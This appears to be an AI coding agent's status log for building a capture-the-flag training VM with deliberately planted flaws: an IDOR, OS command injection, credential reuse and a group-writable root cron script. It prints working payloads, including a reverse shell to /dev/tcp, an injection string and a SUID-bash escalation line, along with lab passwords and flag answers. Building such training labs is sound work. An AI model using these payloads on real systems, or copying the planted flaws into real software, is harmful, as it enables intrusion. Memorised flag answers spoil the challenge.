# Project Status — The Forgotten Administrator

Last updated: 2026-10-09 (Phase 0 → Phase 1)

## Legend
- DONE — built and verified (tests run, output observed)
- IN PROGRESS
- INCOMPLETE — not started, or started but not verified
- BLOCKED — needs a decision or permission from the project owner

## Environment (Phase 0 — DONE)

| Item | Status | Notes |
|---|---|---|
| OS detected | DONE | Ubuntu 26.04 LTS, x86_64, 40 CPU, 123GB RAM, 94GB free disk |
| KVM available | DONE (device present) | `/dev/kvm` exists; current user not yet in `kvm` group |
| VM tooling (qemu/cloud-image-utils/genisoimage) | INCOMPLETE | Available in apt, not installed — needs `sudo apt-get install`, owner must run it |
| Docker | DONE (available) | Installed, user in `docker` group. Used only for optional local dev, not as the delivered artifact |
| Python 3 + venv | DONE | Python 3.14.4 |
| git | DONE | 2.53.0; project repo initialized |
| sqlite3 (Python stdlib) | DONE | 3.46.1, no server needed |
| sqlite3 CLI | INCOMPLETE | not installed (optional, for manual inspection) |
| exiftool | INCOMPLETE | not installed — needed for Stage 2 metadata file generation/verification |
| openssl / gpg | DONE | both present |
| Flask | DONE | installed into `app/.venv` (flask 3.1.0, cryptography 43.0.3, pytest 8.3.3) |

## Test framework (Phase 1 — verified)

Ran `./scripts/run-tests.sh`:
```
app/tests/test_placeholder.py::test_framework_is_wired_up PASSED [100%]
1 passed in 0.01s
```
Confirms pytest + the project venv are correctly wired end-to-end. This is a
placeholder test only — it proves the harness works, not that the
application works (there is no application yet).

## Phase checklist

- [x] Phase 0 — Environment & plan
- [x] Phase 1 — Skeleton (this commit) — directories, docs, scripts, venv, test framework verified
- [x] Phase 2 — Application (Flask app, seeded users, IDOR, admin command injection, tests) — verified below
- [x] Phase 3 — Linux identity & admin function (VM build) — verified below
- [x] Phase 4 — Flags & story (15 flags, encryption, manifest) — verified below
- [x] Phase 5 — Privilege escalation — verified below
- [x] Phase 6 — Documentation (player + instructor) — verified below
- [x] Phase 7 — Integration testing — verified below
- [x] Phase 8 — Packaging — verified below. **Project complete.**

## Phase 2 — Application (DONE, verified)

Implemented `app/forgotten_admin/` (Flask app, SQLite via stdlib `sqlite3`):

- Seeded web identities: `john` (normal), `admin` (app-admin) — **web
  identities only**, not the Linux OS accounts (those come in Phase 3).
- `records.py`: `/records/<id>` — **intentional IDOR**: checks login but
  not ownership. John can read admin's record by changing the id.
- `admin.py`: `/admin/diagnostics` — admin-only "ping a host" tool with an
  **intentional OS command injection** (string-built shell command,
  `shell=True`, no input validation). Gated by `admin_required`, so a
  normal user needs the admin's credentials to reach it at all.
- The admin's record (the "administrative resource") contains the
  seeded admin web password and points to `/admin/diagnostics` — this is
  the IDOR disclosure that lets a player pivot from `john` to `admin`.
- `db.py seed_db()` is idempotent (checked by test, see below).
- Chosen VM guest OS for Phase 3 (per owner discussion): **Ubuntu Server
  24.04 LTS** cloud image, via QEMU/KVM + cloud-init.

**Tests run and observed** (`./scripts/run-tests.sh`):
```
15 passed in 4.27s
```
Including, specifically:
- `test_john_can_access_own_record` — PASSED
- `test_john_can_access_admin_record_via_idor` — PASSED (proves the IDOR
  as designed: john reads admin's record and sees the admin credential +
  diagnostics pointer)
- `test_diagnostics_requires_admin_role` — PASSED (john, even without
  admin credentials, gets 403)
- `test_diagnostics_command_injection` — PASSED (a `; touch <marker>`
  payload in the `host` field creates the marker file — non-destructive,
  scoped to pytest's own tmp_path, no network listener opened)
- `test_seed_is_idempotent` — PASSED (seeding twice doesn't duplicate
  users/records)

Also manually smoke-tested outside pytest (direct Flask test client calls):
`/healthz` → 200, login → redirect, `/records/2` as john → 200 with
admin's content. Matches automated test results.

**Not yet true, and not claimed:** the command injection does NOT yet
produce a real reverse shell as a Linux `admin` OS user — there is no VM
yet. That wiring (sudoers rule invoking this same code path as the Linux
`admin` account, plus a documented reverse-shell workflow against the
isolated lab network) is Phase 3.

## Phase 3 — Linux identity & VM build (DONE, verified)

Built a real, booted VM: Ubuntu Server 24.04 LTS (official cloud image,
checksum-verified) under QEMU with cloud-init (NoCloud), host-only
networking (QEMU user-mode NAT, no bridge). Lives in `vm/` — see
`vm/README.md` and `instructor-material/build-guide.md`.

- Linux accounts created: `john` (console password only, no SSH),
  `admin` (console password only, no SSH), `ctfbuilder` (instructor-only,
  SSH key only, used for provisioning). `root` login disabled.
- Fixed a real bug found during build: Ubuntu's cloud image already has
  a system group named `admin`; creating a user of the same name without
  `no_user_group`/`primary_group` collided and silently failed to create
  the account. Fixed in `vm/cloud-init/user-data.yaml`, then **rebuilt
  the VM from scratch** with the fix (not patched by hand) to verify the
  documented build path is actually correct end to end.
- `forgotten-admin.service` (systemd) runs the Phase 2 Flask app **as the
  Linux `admin` account** — confirmed via `ps -o user= -C python3` →
  `admin`.
- `/home/admin/{README.txt,evidence/,flags/}` laid out per Section 11,
  mode 750, owned by `admin:admin`.

**Live end-to-end exploit chain run against the actual booted VM** (not
just pytest against the dev app):
```
curl .../login (john)                      → 302 (session cookie)
curl .../records/1  (john's own record)     → 200, "Handover notes"
curl .../records/2  (admin's record, IDOR)  → 200, discloses admin web
                                               password "N3tOps-Diag#7"
                                               + pointer to /admin/diagnostics
curl .../admin/diagnostics as john           → 403 (role gate holds)
curl .../login (admin, disclosed password)   → 302
curl POST .../admin/diagnostics
     host="127.0.0.1; whoami > /tmp/fa_live_proof.txt; id >> ..."
                                               → 200
ssh ctfbuilder@vm 'cat /tmp/fa_live_proof.txt'
     → "admin" / "uid=1002(admin) gid=110(admin) groups=110(admin)"
ssh ctfbuilder@vm 'stat -c "%U:%G" /tmp/fa_live_proof.txt'
     → admin:admin
```
This proves the full Section 9/10 chain for real: IDOR discloses the
admin credential, the admin-only diagnostics endpoint's command injection
executes arbitrary commands, and those commands run as the Linux `admin`
OS account — not root, not the process that handles John's login. Proof
file was removed afterward (via `sudo rm`, since it's owned by `admin`
not `ctfbuilder`) — no leftover test artifacts.

- John is confirmed unable to read `/home/admin` (`Permission denied`).
- `/healthz` reachable only via the host-only forwarded port
  `127.0.0.1:8080` (QEMU user-mode NAT) — no bridge, no public exposure.

**Not yet true:** no privilege-escalation mechanism exists yet (Phase 5)
— `admin` currently has no path to `root` at all, which is correct for
this phase. No flags are placed yet (Phase 4).

## Phase 4 — Flags & story (DONE, verified)

Built via `scripts/author_flags.py` (single source of truth) +
`scripts/validate_flags.py` (`./scripts/validate-flags.sh`):

- **15 unique flags**: 5 genuine (`SYN{...}`, 800 points total:
  100/100/150/200/250), 10 decoys (`FFLAG:...`, 0 points).
- **Encryption distribution exactly per spec**: genuine flags 1-2
  plaintext, 3-5 encrypted (3 total); decoys 5 plaintext + 5 encrypted
  (8 encrypted overall).
- **Crypto**: `challenge-data/tools/flagcrypto.py` — scrypt (password
  KDF) + AES-256-GCM (authenticated encryption), via the `cryptography`
  library. Not homemade. This exact file ships to players (no secrets
  in it) and is also installed on the VM at `/opt/tools/flagcrypto.py`
  (system `python3-cryptography` package, usable by any account).
- **Stage content**: `challenge-data/stage1-osint/` (profile + project
  page), `stage2-metadata/` (3 PNGs with real EXIF via `exiftool`),
  `stage3-git-history/` (a real nested git repo, 4 commits, with the
  flag3/decoy3b ciphertext + passphrase notes deliberately removed from
  the current working tree but recoverable via `git show`).
- **Stage 4/5 artifacts deployed onto the live VM** via
  `vm/scripts/deploy-flags.sh`: `/home/admin/evidence/`,
  `/home/admin/flags/` (admin:admin, mode 640), `/root/` (root:root,
  mode 600).
- **Flag 5's password is Flag 3's decrypted plaintext value** (not
  Flag 3's own password, not any Linux password) — exactly per spec
  Section 13.

**A real bug found and fixed during this phase:** `deploy-flags.sh`'s
`chmod 640 /home/admin/evidence/*` initially failed ("No such file or
directory") even though the files existed. Root cause: shell glob
expansion for `*` happens in the *calling* (ctfbuilder) shell, before
`sudo` escalates — and ctfbuilder can't read that 750 `admin`-owned
directory to expand the glob. Fixed by moving the glob expansion inside
`sudo bash -c '...'` so it runs as root.

**`./scripts/validate-flags.sh` output (all passed):**
```
[ OK ] exactly 5 genuine flags (5)
[ OK ] exactly 10 decoy flags (10)
[ OK ] 3 genuine flags encrypted (3)
[ OK ] 5 decoy flags encrypted (5)
[ OK ] all 15 flag values are unique
[ OK ] all genuine flags use the SYN{...} format
[ OK ] all decoy flags use the FFLAG:... format
[ OK ] no decoy value matches a genuine value
[ OK ] max score == 800 (800)
[ OK ] all decoys award 0 points
[ OK ] original_flag_3/4/5: decrypt correctly + reject wrong password
[ OK ] d3b/d4b/d5b: decrypt correctly + reject wrong password
RESULT: all checks passed
```
(`d1b`/`d2b` are embedded in HTML/image media rather than standalone
files; both were manually decrypted and confirmed correct in this
session — see terminal output in this phase's work, not re-run by the
automated validator.)

**Live, full chain re-verified on the actual VM after deployment:**
`john` login → IDOR on `/records/2` → admin credential disclosure →
admin login → command injection as Linux `admin` → read
`/home/admin/evidence/decrypt_notes.txt` → decrypt
`original_flag_4.enc` → `SYN{admin_blindspot_9f4e2c18}`. Separately
(simulating post-privesc access via `sudo`, since Phase 5 doesn't exist
yet): decrypt `/root/final_evidence.enc` with Flag 3's plaintext →
`SYN{root_of_all_evidence_3b7d55a0}`. `admin` confirmed unable to read
`/root` at all.

**Not yet true:** no privilege-escalation mechanism exists (Phase 5) —
the final-artifact decrypt above was performed via instructor `sudo`,
not by a player actually escalating from `admin` to `root`. Player and
instructor docs updated to match the real implementation, but Stage 5's
hint-sheet entries are still placeholders pending Phase 5.

## Phase 5 — Privilege escalation (DONE, verified)

Mechanism: `/etc/cron.d/admin-tools-cleanup` runs
`/opt/admin-tools/cleanup.sh` as root every minute; the script is
`root:admin` mode `664` — group-writable, and Linux `admin`'s primary
group is `admin`. One single, deliberate weakness (Section 12) — no
sudo rights for `admin` at all, no other SUID/cron shortcuts. Full
rationale in `instructor-material/privesc-design.md`. Added by
`vm/scripts/remote-provision.sh`; reset by the new
`vm/scripts/reset-privesc.sh`.

**Live, genuine exploitation performed as `admin`, with zero instructor
`sudo` involvement** (not simulated):
```
sudo -u admin bash -c 'echo "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash" >> /opt/admin-tools/cleanup.sh'
# waited for the real cron tick (next minute, observed via polling)
sudo -u admin bash -c '/tmp/rootbash -p -c "id"'
# -> uid=1002(admin) gid=110(admin) euid=0(root) groups=110(admin)
sudo -u admin bash -c '/tmp/rootbash -p -c "cat /root/root_note.txt; python3 /opt/tools/flagcrypto.py decrypt \"SYN{git_ghost_61ace7b2}\" /root/final_evidence.enc -"'
# -> SYN{root_of_all_evidence_3b7d55a0}   (Original Flag 5, 250 pts)
```
This is the full, real Section 13 progression (steps 7–13) completed
end to end on the live VM: enumerate → exploit the cron weakness →
become root → read the root-only artifact → unlock it with Flag 3's
plaintext → recover Flag 5.

**Reset tested and verified:** re-exploited to leave an artifact
(`/tmp/leftover_test_marker`, created by the real cron tick), ran
`./scripts/reset-privesc.sh`, confirmed `cleanup.sh` restored to clean
content/permissions (`664 root:admin`) and no leftover SUID shell.
(The arbitrarily-named test marker itself, being outside the script's
intentionally bounded cleanup patterns, was removed by hand — by
design, this reset script never does a blanket `/tmp` wipe.)

**Boundary checks confirmed on the live VM:**
- `admin` has no sudo rights at all (`sudo -n -l` → "a password is
  required", no NOPASSWD entries).
- `find / -perm -4000` shows only the base Ubuntu image's standard SUID
  binaries — no leftover escalation artifacts after reset.
- `/etc/cron.d/admin-tools-cleanup` itself is not writable by `admin`
  (only the script it invokes is).
- Original Flag 3's password (`BlueHarbor-99`) is confirmed distinct
  from any Linux account password, and from the final artifact's
  password (Flag 3's *decrypted value*, `SYN{git_ghost_61ace7b2}`).

## Phase 6 — Documentation (DONE)

Completed the remaining instructor-material placeholders and fixed one
real inaccuracy found while reviewing:

- `instructor-guide.md` — document map, intended-path summary, event
  run checklist, known limitations, written from the actual build.
- `troubleshooting.md` — the 4 real bugs hit during this build (cloud-
  init admin/group collision, `scp -p` vs `-P`, glob-expansion-before-
  sudo ordering, `-nographic`/`-daemonize` conflict) and their actual
  fixes — not generic advice.
- `security-review.md` — checked against the live VM: network isolation
  (loopback-only hostfwd, no bridge), account isolation (`admin` has no
  sudo, `root` login disabled, app never runs as root), flag/credential
  hygiene (no real orgs/people, no homemade crypto, no decoy/genuine
  collision), and a live `ss -tlnp` listening-service check (only SSH +
  the app, nothing unexpected). One honest gap flagged: multi-host lab
  networking hasn't been tested, only single-host loopback.
- `build-guide.md` updated to include the Phase 4/5 steps
  (`author_flags.py`, `validate-flags.sh`, `deploy-flags.sh`,
  `reset-privesc.sh`) that didn't exist when it was first written.
- Fixed a real inaccuracy in `player-material/Getting-Started.md`: it
  told players to expect an SSH client for their eventual shell, but
  the intended path never gives players SSH access — they get a shell
  via the command-injection vulnerability itself. Corrected to describe
  setting up a listener instead.

## Phase 7 — Integration testing (DONE)

Ran every check in the project spec's Section 21 acceptance checklist
(A-G) against the live VM in this session; full detail with evidence in
`instructor-material/acceptance-test-report.md`. Highlights beyond what
earlier phases already covered:

- **A4 (app reset)**: stopped the service, deleted the sqlite DB,
  re-ran `provision.sh` — re-seeded correctly, service restarted on a
  new PID, health check passed.
- **G2 (reproducible VM starting state)**: deliberately deleted
  `original_flag_4.enc` and stopped the app service, took a
  `qemu-img snapshot`, restored it, and confirmed both were back
  exactly as before — plus the privesc weakness still correctly in
  place and no leftover exploit artifacts. The resulting `clean-start`
  snapshot is now the VM's actual baseline for resetting between teams.
- **G4 (real reverse shell, not just a `sudo -u admin` proxy)**:
  started `nc -lvnp 4444` on the host, triggered
  `bash -i >& /dev/tcp/10.0.2.2/4444 0>&1` via the live command
  injection — the listener genuinely caught the connection and dropped
  into `admin@forgotten-admin:...$`. Confirms the host/guest IP
  distinction documented in `vm/networking.md` (`10.0.2.2`, not
  `127.0.0.1`) is actually correct, and that this specific player-facing
  workflow — not just the underlying vulnerability — really works.
- **E6**: functionally tested the scoring-guide.md snippet with a
  genuine flag (100 pts), a decoy (0 pts), and junk input (not
  recognized) — all three correct.

All A-G checks: **PASS**. Two honest gaps remain, stated in the report:
multi-host lab networking untested (only single-host loopback), and
Section G3 (no accidental shortcut) is a reasoned check of the
implemented surface, not an exhaustive penetration test.

## Phase 8 — Packaging (DONE)

- **Finished the remaining stub scripts** (`scripts/build.sh`,
  `health-check.sh`, `reset.sh`) — all three were Phase-1 placeholders;
  now real, tested orchestrators delegating to the actual VM logic.
  `health-check.sh`'s failure-detection was spot-tested (made the
  privesc script temporarily non-writable, confirmed it correctly
  reported `[FAIL]`, restored it).
- **`vm/scripts/export-vm.sh`**: flattens the VM's `clean-start`
  snapshot into a standalone qcow2 (no backing-file dependency),
  checksummed, with `IMPORT.md`. **Actually booted the exported image
  independently** on isolated ports (2223/8081) with
  `snapshot=on` to avoid touching the artifact — confirmed accounts,
  app (`/healthz`), the app running as `admin`, all 4 deployed flag
  files, and the privesc weakness were all intact in that independent
  boot. This is a genuinely verified, distributable VM image, ~1.3GB,
  at `vm/dist/forgotten-admin-ctf.qcow2`.
- **`scripts/package.sh`**: produces separate `dist/player-package`
  (`player-material/` + the player-facing parts of `challenge-data/`)
  and `dist/instructor-package` (everything else, including the
  exported VM and the private SSH key). Includes an automated check
  that **aborts the build** if any decrypted genuine-flag value or
  `flag-manifest.json` ends up in the player package — **spot-tested
  for real**: planted a genuine flag value in the player-material
  source, re-ran the script, confirmed it printed `LEAK:` and exited 1;
  reverted the plant and confirmed a clean re-run.
- **`HANDOVER-REPORT.md`**: the final report against the spec's own
  Definition of Done (Section 24), every item backed by evidence
  already recorded in this file or `acceptance-test-report.md`.
- Final regression pass before this commit: `run-tests.sh` (15
  passed), `validate-flags.sh` (all checks passed), `health-check.sh`
  (healthy) — all re-run clean after all packaging work.

**This completes all 8 phases of the project.** Honest limitations
carried forward (not fixed in this phase, stated plainly): multi-host
lab networking untested (only single-host loopback), no exhaustive
red-team pass for unintended shortcuts, and no separate KVM-accelerated
verification (everything here ran under TCG software emulation).

## Addendum — self-contained materials (post-Phase-8)

The user asked, after Phase 8, whether a player could just import the
box and play without a separately-handed-out folder. Answer at the
time: **no, not yet** — Stage 1-3 content only existed as a separate
`dist/player-package`. Fixed:

- New `app/forgotten_admin/materials.py` blueprint: serves
  `challenge-data/{stage1-osint,stage2-metadata,tools}` and a new
  `stage3-git-history.tar.gz` archive (built by `author_flags.py`)
  directly from the running app, unauthenticated, at `/materials/`.
  Uses `send_from_directory` throughout (rejects path traversal by
  construction). `/` is now a public landing page, not a login
  redirect.
- `PUBLIC_DATA_DIR` config (dev default: the repo's own
  `challenge-data/`; VM: `/opt/forgotten-admin/public-data`, a curated
  root:root 755/644 copy containing only player-safe content, deployed
  by `provision.sh`/`remote-provision.sh`).
- 9 new tests (`test_materials.py`, 24 total now), including path-
  traversal rejection — all passing.
- **A real bug found while deploying this**: `remote-provision.sh` used
  `systemctl enable --now`, which does **not** restart an already-
  running service when its unit file or the app code changes — it's a
  no-op if already active. The new code silently never loaded on
  re-provision. Fixed: `enable` (persist across reboots) +
  unconditional `restart` (always picks up changes), confirmed live
  (new PID, fresh start time, `/materials/` immediately reachable).
- Verified live on the VM: landing page, materials index, OSINT page
  (contains Flag 1), metadata photo (real PNG), Stage 3 archive
  (downloaded, extracted, `git log`/`git show` recovered the deleted
  backup + passphrase exactly as before), flagcrypto.py tool download,
  and path traversal correctly rejected (`404`) against two different
  traversal attempts.
- `health-check.sh` extended with 2 checks for this; all pass.
- Docs updated: `player-material/Getting-Started.md` (materials are on
  the box now, separate folder is a documented fallback only),
  `instructor-material/solution-walkthrough.md` (Stage 1-3 steps now
  reference the live `/materials/` URLs), `instructor-material/
  security-review.md` (new row for this surface), `SETUP.md`.

## Addendum 2 — credential reuse instead of reverse shell; 5 decoys instead of 10

Per owner request: replaced Stage 4's command-injection/reverse-shell
mechanism, and reduced the decoy count.

**Stage 4 mechanism change:**
- Removed `app/forgotten_admin/admin.py` (the `/admin/diagnostics`
  command-injection route), its template, and its 4 tests entirely —
  not just the reverse-shell step, the whole vulnerability. Stage 4's
  "second vulnerability" is now credential reuse: the admin web
  password disclosed via the IDOR is also, by design, the Linux
  `admin` account's real SSH password.
- `vm/scripts/remote-provision.sh` now: `chpasswd`s `admin` to match
  the web password, and adds
  `/etc/ssh/sshd_config.d/90-admin-password-auth.conf` (an sshd
  `Match User admin` block) so password auth is enabled for that one
  account only — every other account stays key-only/disabled.
- Verified live with `pexpect` (genuine password-prompt automation, not
  a `sudo` proxy): `admin` logs in with the disclosed password → `id`
  → `uid=1002(admin)`. `john`, tried the same way with his own real
  password, → `Permission denied (publickey)` — password auth isn't
  even offered to him. Ran the **entire** chain (decrypt Flag 4 →
  enumerate cron → exploit the group-writable script → wait for the
  real cron tick → `euid=0` → decrypt the final artifact → Flag 5) in
  one continuous SSH session opened this way, no instructor `sudo`
  anywhere in it.
- `health-check.sh` gained 2 permanent checks for this (admin password
  login works; john's is rejected).

**A real permissions bug found and fixed while doing this:** after
reducing the decoy set, `deploy-flags.sh`'s `cp`-based copy left a
stale decoy file (`original_flag_4_backup.enc`) behind on the VM, and
switching to `rsync -a` to fix that **silently loosened `/root` itself
from mode `700` to `775`** — `rsync -a` propagates the *local staging
directory's* own permission bits onto an already-existing destination
directory. Caught by actually reading the `ls -la /root` output rather
than assuming the copy was equivalent to the old `cp`. Fixed with
`--no-perms` on every affected `rsync` call plus an unconditional
`chmod 700 /root` / `chmod 750` on the evidence dirs as a hard
safeguard regardless of how the copy happens. Re-verified live.

**Decoys: 10 → 5 (one per stage).** Kept one plaintext + building a mix
across stages (`d1a`, `d4a` plaintext; `d2b`, `d3b`, `d5b` encrypted —
3 encrypted decoys now, not 5). `scripts/validate_flags.py` and
`scripts/author_flags.py` updated accordingly; `validate-flags.sh`
re-passes all checks (10 total flags now, not 15).

**Decoy/genuine "obviousness" balance (owner request):** decoys are
now deliberately loud — boxed/highlighted callouts, "found a flag!"
framing, passwords that announce themselves, positioned first or
closer to the surface (e.g. the Stage 3 decoy commit sits one commit
closer to `HEAD` than the genuine one, so a player scanning `git log`
hits it first). Genuine flags are deliberately quiet — blended into
ordinary prose (e.g. Flag 1 is now inside a changelog sentence, not a
separate "Build fingerprint:" line) and require actually reading, not
skimming. Verified live that this doesn't change discoverability of
the genuine path, only its obviousness relative to the decoy.

Docs updated to match: `player-material/{Getting-Started,Story,
Flag-Submission,README}.md`, `instructor-material/{instructor-guide,
hint-sheet,solution-walkthrough,security-review,scoring-guide,
acceptance-test-report}.md`, `vm/{README,networking}.md`, root
`README.md`.

## Addendum 3 — hint-sheet.md removed per owner request

Deleted `instructor-material/hint-sheet.md` from the repo (owner
request). Removed its row from `instructor-guide.md`'s document map.
History still in git if it's ever wanted back. No code or test
depended on this file, so nothing else needed to change.

## Addendum 4 — fixed two real cross-hypervisor bugs found testing on real VirtualBox

Owner reported: imported the OVA into VirtualBox, networking never
came up under NAT *or* Bridged, and a password changed via GRUB
recovery mode didn't survive a reboot. This image had only ever been
tested under QEMU before — this was genuinely new information.

**Root cause, found by reading the actual on-disk config rather than
guessing further:** `/etc/netplan/50-cloud-init.yaml` was pinned to
the exact MAC address of the original QEMU virtio NIC
(`match: {macaddress: "52:54:00:12:34:56"}`) — cloud-init's fallback
network generator writes this when no explicit `network-config` is
supplied. VirtualBox's virtual NIC gets a different MAC, the rule
never matches, DHCP never runs — identically under NAT or Bridged,
since the bug is entirely guest-side.

**Fixed:**
- Added `vm/cloud-init/network-config.yaml` (match by interface
  *name*, `en*`, not MAC) and wired it into `create-disk.sh` via
  `cloud-localds -N`, so future from-scratch builds get this right.
- Patched the already-provisioned dev VM's netplan file directly and
  confirmed it kept working (`netplan apply`, SSH stayed reachable).
- Also fixed, proactively: `export-ova.sh`'s hand-written OVF
  descriptor declared a VMware-style `VirtualSCSI` disk controller
  that was never actually validated against real VirtualBox (no
  VirtualBox available in this build environment). Switched to plain
  IDE (`PIIX4`) — universally, unambiguously supported.

**Investigated and ruled out as a disk-persistence bug:** the
password-not-persisting symptom. Tested directly on the dev VM
(unrelated to VirtualBox): set a test password, captured its shadow
hash, issued a real reboot, compared — byte-identical. This image's
filesystem persistence is fine. Likely explanation, stated as a
hypothesis (not confirmed — would need the owner's VirtualBox session
to verify): Ubuntu recovery mode often mounts `/` read-only until you
`mount -o remount,rw /` first.

**Re-verified everything** on a fresh clean-start snapshot, then on
the actual re-exported OVA booted independently (isolated ports, disk
untouched): netplan is name-matched not MAC-pinned, `admin` SSH
password login works, `/materials/` still self-contained,
`health-check.sh` all green.

**Not yet done:** uploading the new OVA (`ova-export-v4`) as a GitHub
release — blocked by the harness's own auto-mode classifier
("Create Public Surface"), which requires the user's explicit
approval for this specific action. The built, checksummed, verified
`.ova` is sitting in `vm/dist/` ready to upload; only the `gh release
create` step itself needs the owner to run it (or approve it).

Docs updated: `instructor-material/troubleshooting.md` (new entries,
same Symptom/Cause/Fix format as the rest of the file).

## Addendum 5 — tried a broader netplan fix, it hung the VM; reverted; added instructor credentials doc

Owner asked to make the DHCP fix accept *any* MAC VirtualBox assigns
(already true of Addendum 4's fix) and requested a consolidated
instructor credentials reference.

**Tried `match: {}` (match every ethernet device, not just `en*`-named
ones) as a theoretically more robust version of Addendum 4's fix.**
Applying it via `netplan apply` over the SSH session on the same
interface hung that session and left the VM unreachable on every
forwarded port for 45+ minutes (confirmed not just busy: `info status`
in the QEMU monitor showed `running`, but only ~15% average CPU —
inconsistent with genuine background load, consistent with a stuck
network stack). Confirmed it wasn't a shell-quoting artifact by
retrying with a clean non-heredoc command via a backgrounded job with
its own timeout; it hung identically both times. No console input
path exists on this VM (`-display none`, serial output-only), so
there was no way to intervene directly — recovered by restoring the
`clean-start` snapshot taken minutes earlier.

**Reverted to the Addendum 4 fix** (`match: {name: "en*"}`), which was
already separately verified: applies cleanly, survives a real reboot,
and is what's already baked into `ova-export-v4` (built and verified
*before* this detour — unaffected by it, no rebuild needed).
`vm/cloud-init/network-config.yaml` now documents why the broader
match was tried and reverted, so it isn't re-attempted blind later.

**Added `instructor-material/credentials.md`**: a single reference
for getting into the box directly (any deployment: dev VM or an
imported OVA) without completing the CTF — `ctfbuilder` SSH + `sudo
-i` for a root shell, the `john`/`admin` story-account passwords for
completeness, reset commands, and what to do with a pre-built OVA you
don't have the matching key for. Every command in it was actually run
against the live VM and its real output checked — including catching
and fixing a syntax bug in my first draft (`sudo -i -c` isn't valid;
confirmed the working form is `sudo bash -c "..."`).

Still blocked on the owner's side (unchanged from Addendum 4): `git
push` and uploading `ova-export-v4` as a GitHub release, both denied
by the harness's auto-mode classifier this session.

## Outstanding items requiring the project owner

1. **Install VM build tooling** (needs sudo password, interactive):
   ```
   sudo apt-get update && sudo apt-get install -y qemu-system-x86 qemu-utils \
     cloud-image-utils genisoimage libimage-exiftool-perl sqlite3
   ```
   Needed before Phase 3 (VM build). Not blocking Phases 1–2.
2. **`kvm` group membership** — may be needed for non-root QEMU acceleration;
   will revisit at Phase 3 (fallback: software emulation, slower but works).

## Known constraints carried through every phase

- Exactly 5 genuine flags (`{flag_text}`, see Section 4 format), 10 decoys
  (`FFLAG:{flag_text}`). 3 genuine + 5 decoy flags encrypted (8 encrypted total).
- Flag 3's decrypted value is the **password for the final artifact**, not the
  Linux root password.
- Private instructor manifest never lives under any player-accessible path.
- VM networking is host-only; no bridged/public exposure.
- No real orgs/people/credentials; no homemade crypto.
